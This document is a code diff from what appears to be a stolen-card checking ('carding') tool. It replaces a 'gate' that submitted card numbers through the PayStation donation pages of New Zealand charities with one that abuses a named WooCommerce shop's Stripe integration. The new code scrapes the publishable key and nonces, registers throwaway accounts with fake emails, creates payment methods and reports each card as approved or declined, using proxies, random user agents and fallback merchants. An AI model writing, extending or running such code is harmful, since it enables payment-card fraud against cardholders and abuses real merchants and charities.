@@ -901,202 +901,182 @@ def check_cc_charge(cc_number, month, year, cvv, proxies=None):
         return f"Error: {str(e)}"
 
 
-STC_MERCHANTS = [
+STC_STRIPE_MERCHANTS = [
     {
-        'name': 'Cancer Society NZ',
-        'donate_url': 'https://www.cancer.org.nz/donate/',
-        'payment_url': 'https://www.cancer.org.nz/paymentendpoint/',
+        'name': 'Flavor Boutique',
+        'base': 'https://flavorboutique.com',
+        'register': '/my-account/',
+        'type': 'woo_stripe',
     },
     {
-        'name': 'Rescue Helicopter NZ',
-        'donate_url': 'https://www.rescue.org.nz/donate/',
-        'payment_url': 'https://www.rescue.org.nz/donate/',
-    },
-    {
-        'name': 'Starship NZ',
-        'donate_url': 'https://www.starship.org.nz/donate/',
-        'payment_url': 'https://www.starship.org.nz/donate/',
+        'name': 'Flavor Boutique ALT',
+        'base': 'https://www.flavorboutique.com',
+        'register': '/my-account/',
+        'type': 'woo_stripe',
     },
 ]
 
 
-def check_cc_stc(cc_number, month, year, cvv, proxies=None):
-    """STC gate — PayStation NZ with multiple merchant fallbacks + exponential backoff."""
-    start_time = time.time()
+def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
+    """STC sub-gate: WooCommerce Stripe auth on a given merchant."""
+    session = requests.Session()
     ua = _rand_ua()
+    base_url = merchant['base']
+    start = time.time()
 
-    exp_mm = month.zfill(2)
-    exp_yy = year[-2:] if len(year) == 4 else year.zfill(2)
-    card_expiry = f"{exp_mm}{exp_yy}"
-
-    if faker:
-        card_name = faker.name()
-    else:
-        card_name = "John Smith"
-
-    last_error = "All STC merchants failed"
-
-    for merchant in STC_MERCHANTS:
-        session = requests.Session()
-        try:
-            # Step 1: Get the donation/payment page to find PayStation hosted URL
-            for attempt in range(3):
-                try:
-                    resp1 = session.get(merchant['payment_url'], headers={
-                        'User-Agent': ua,
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    }, proxies=proxies, timeout=12, allow_redirects=True)
-                    if resp1.status_code == 200:
-                        break
-                    elif resp1.status_code >= 500:
-                        if attempt < 2:
-                            time.sleep(2 * (attempt + 1))
-                            continue
-                        last_error = f"{merchant['name']} HTTP {resp1.status_code}"
-                        break
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    if attempt < 2:
-                        time.sleep(2 * (attempt + 1))
-                        continue
-                    last_error = f"{merchant['name']} unreachable"
+    try:
+        # Step 1: Visit account/register page to get nonce + Stripe pk
+        reg_url = base_url + merchant['register']
+        for attempt in range(3):
+            try:
+                resp1 = session.get(reg_url, headers={'User-Agent': ua}, proxies=proxies, timeout=12, allow_redirects=True)
+                if resp1.status_code == 200:
                     break
+                if resp1.status_code >= 500 and attempt < 2:
+                    time.sleep(2 * (attempt + 1))
+                    continue
+            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                if attempt < 2:
+                    time.sleep(2 * (attempt + 1))
+                    continue
+                return None, f"{merchant['name']} unreachable"
+        else:
+            return None, f"{merchant['name']} HTTP {resp1.status_code}"
+
+        if resp1.status_code != 200:
+            return None, f"{merchant['name']} HTTP {resp1.status_code}"
+
+        # Extract Stripe pk
+        pk_match = re.search(r'"(?:key|publishableKey|stripe_publishable_key|pk)"[:\s]*"(pk_(?:live|test)_[A-Za-z0-9]+)"', resp1.text)
+        if not pk_match:
+            pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
+        if not pk_match:
+            return None, f"{merchant['name']} no Stripe key"
+
+        pk = pk_match.group(0) if not hasattr(pk_match, 'group') else pk_match.group(0)
+        # Clean — if it matched as "pk":"pk_live_xxx", extract just the key
+        pk_clean = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', pk)
+        pk = pk_clean.group(0) if pk_clean else pk
+
+        # Extract nonce
+        nonce_match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', resp1.text)
+        if not nonce_match:
+            nonce_match = re.search(r'"register[_-]nonce"[:\s]*"([^"]+)"', resp1.text)
+
+        # Try to register a throwaway account
+        if nonce_match:
+            reg_nonce = nonce_match.group(1)
+            if faker:
+                email = faker.email()
             else:
-                continue
+                email = f"user{random.randint(10000,99999)}@gmail.com"
 
-            if resp1.status_code != 200:
-                continue
-
-            # Also try the donate page if payment page didn't have PayStation
-            pages_to_check = [resp1]
-            if merchant['donate_url'] != merchant['payment_url']:
-                try:
-                    resp_donate = session.get(merchant['donate_url'], headers={'User-Agent': ua}, proxies=proxies, timeout=10, allow_redirects=True)
-                    if resp_donate.status_code == 200:
-                        pages_to_check.append(resp_donate)
-                except Exception:
-                    pass
-
-            # Step 2: Find PayStation hosted URL from any page
-            hosted_url = None
-            for page_resp in pages_to_check:
-                ps_match = re.search(r'https://payments\.paystation\.co\.nz/hosted/?\?[^"\'>\s]+', page_resp.text)
-                if not ps_match:
-                    ps_match = re.search(r'action=["\']?(https://payments\.paystation\.co\.nz[^"\'>\s]*)', page_resp.text)
-                if not ps_match:
-                    # Look for iframe src
-                    ps_match = re.search(r'src=["\']?(https://payments\.paystation\.co\.nz[^"\'>\s]*)', page_resp.text)
-                if ps_match:
-                    hosted_url = ps_match.group(0).rstrip('"\'> ')
-                    # Clean up if it starts with action= or src=
-                    for prefix in ('action=', 'src='):
-                        if hosted_url.startswith(prefix):
-                            hosted_url = hosted_url[len(prefix):].strip('"\'')
-                    break
-
-            if not hosted_url:
-                last_error = f"{merchant['name']} no PayStation URL found"
-                continue
-
-            # Step 3: Load the PayStation hosted page to get hk token
-            resp2 = session.get(hosted_url, headers={
-                'User-Agent': ua,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Referer': merchant['donate_url'],
-            }, proxies=proxies, timeout=15)
-
-            if resp2.status_code != 200:
-                last_error = f"PayStation page HTTP {resp2.status_code}"
-                continue
-
-            # Extract hk token — REQUIRED for ajax.php to work
-            hk_match = re.search(r'name=["\']?hk["\']?\s+value=["\']?([^"\'>\s]+)', resp2.text)
-            if not hk_match:
-                hk_match = re.search(r'["\']hk["\']\s*:\s*["\']([^"\']+)', resp2.text)
-            if not hk_match:
-                hk_match = re.search(r'hk=([A-Za-z0-9_\-]+)', resp2.text)
-
-            if not hk_match:
-                last_error = f"{merchant['name']} no hk token found"
-                continue
-
-            hk = hk_match.group(1)
-
-            # Step 4: Submit card to PayStation ajax endpoint
-            ajax_url = 'https://payments.paystation.co.nz/hosted/ajax.php'
-            post_data = {
-                'card_number': cc_number,
-                'card_security': cvv,
-                'card_expiry': card_expiry,
-                'card_name': card_name,
-                'verified': 'null',
-                'hk': hk,
+            reg_data = {
+                'email': email,
+                'woocommerce-register-nonce': reg_nonce,
+                'register': 'Register',
             }
+            resp2 = session.post(reg_url, headers={'User-Agent': ua}, data=reg_data, proxies=proxies, timeout=12)
+        else:
+            resp2 = resp1
 
-            for attempt in range(3):
-                try:
-                    resp3 = session.post(ajax_url, headers={
-                        'User-Agent': ua,
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Pragma': 'no-cache',
-                        'Accept': '*/*',
-                        'Origin': 'https://payments.paystation.co.nz',
-                        'Referer': hosted_url,
-                    }, data=post_data, proxies=proxies, timeout=20)
+        # Find the setup intent nonce
+        setup_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce"[:\s]*"([^"]+)"', resp2.text)
+        if not setup_nonce_match:
+            # Try add-payment-method page
+            try:
+                apm_url = base_url + '/my-account/add-payment-method/'
+                resp_apm = session.get(apm_url, headers={'User-Agent': ua}, proxies=proxies, timeout=12, allow_redirects=True)
+                setup_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce"[:\s]*"([^"]+)"', resp_apm.text)
+                if setup_nonce_match:
+                    resp2 = resp_apm
+            except Exception:
+                pass
 
-                    if resp3.status_code == 200:
-                        break
-                    elif resp3.status_code >= 500:
-                        if attempt < 2:
-                            time.sleep(3 * (attempt + 1))
-                            continue
-                    else:
-                        break
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    if attempt < 2:
-                        time.sleep(3 * (attempt + 1))
-                        continue
-                    resp3 = None
-                    break
-            else:
-                last_error = f"PayStation ajax all retries failed"
-                continue
+        if not setup_nonce_match:
+            return None, f"{merchant['name']} no setup nonce"
 
-            if resp3 is None:
-                last_error = f"PayStation timeout after retries"
-                continue
+        ajax_nonce = setup_nonce_match.group(1)
 
-            process_time = round(time.time() - start_time, 2)
+        # Step 2: Create payment method on Stripe
+        pm_url = 'https://api.stripe.com/v1/payment_methods'
+        pm_data = {
+            'type': 'card',
+            'card[number]': cc_number,
+            'card[cvc]': cvv,
+            'card[exp_year]': year if len(year) == 4 else f"20{year}",
+            'card[exp_month]': month,
+            'allow_redisplay': 'unspecified',
+            'billing_details[address][postal_code]': '10001',
+            'billing_details[address][country]': 'US',
+            'key': pk,
+        }
+        resp3 = session.post(pm_url, headers={'User-Agent': ua}, data=pm_data, proxies=proxies, timeout=15)
 
-            if resp3.status_code == 200:
-                try:
-                    rj = resp3.json()
-                    successful = rj.get('successful', False)
-                    error_code = str(rj.get('error_code', ''))
-                    error_msg = rj.get('error_message', '')
+        if resp3.status_code != 200:
+            err = resp3.json().get('error', {}).get('message', resp3.text[:80])
+            return ("declined", err)
 
-                    if successful or error_code == '0':
-                        return f"Approved | {error_msg} ({process_time}s)"
-                    else:
-                        return f"Declined | [{error_code}] {error_msg} ({process_time}s)"
-                except Exception:
-                    text_lower = resp3.text.lower()
-                    if 'successful' in text_lower and 'true' in text_lower:
-                        return f"Approved | {resp3.text[:100]} ({process_time}s)"
-                    return f"Declined | {resp3.text[:100]} ({process_time}s)"
-            elif resp3.status_code == 429:
-                return f"⚠️ PayStation Rate Limited | Try later ({process_time}s)"
-            elif resp3.status_code >= 500:
-                last_error = f"PayStation Server {resp3.status_code} via {merchant['name']}"
-                continue  # Try next merchant
-            else:
-                return f"Declined | HTTP {resp3.status_code} ({process_time}s)"
+        pm_id = resp3.json().get('id')
+        if not pm_id:
+            return ("declined", "No PM ID returned")
 
-        except Exception as e:
-            last_error = f"{merchant['name']}: {str(e)[:50]}"
+        # Step 3: Confirm setup intent via WooCommerce AJAX
+        dynamic_data = {
+            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+            'action': 'create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': pm_id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': ajax_nonce,
+        }
+        resp4 = session.post(base_url + '/', headers={'User-Agent': ua}, params={
+            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+        }, data={
+            'action': 'create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': pm_id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': ajax_nonce,
+        }, proxies=proxies, timeout=15)
+
+        msg = extract_message(resp4)
+        try:
+            success = resp4.json().get("success", False)
+        except Exception:
+            success = False
+
+        if success:
+            return ("approved", msg)
+        else:
+            return ("declined", msg)
+
+    except Exception as e:
+        return None, str(e)[:60]
+
+
+def check_cc_stc(cc_number, month, year, cvv, proxies=None):
+    """STC gate — Stripe WooCommerce auth via alternative merchants (replaces dead PayStation)."""
+    start_time = time.time()
+
+    for merchant in STC_STRIPE_MERCHANTS:
+        result = _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies)
+
+        if result is None:
             continue
 
+        if isinstance(result, tuple) and len(result) == 2:
+            status, detail = result
+            if status is None:
+                continue  # Merchant failed, try next
+            process_time = round(time.time() - start_time, 2)
+            if status == "approved":
+                return f"Approved | {detail} ({process_time}s)"
+            elif status == "declined":
+                return f"Declined | {detail} ({process_time}s)"
+            else:
+                return f"Unknown | {detail} ({process_time}s)"
+
     process_time = round(time.time() - start_time, 2)
-    return f"⚠️ STC All Merchants Failed | {last_error} ({process_time}s)"
+    return f"⚠️ STC All Merchants Failed | Try /auth instead ({process_time}s)"
 
 
 def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
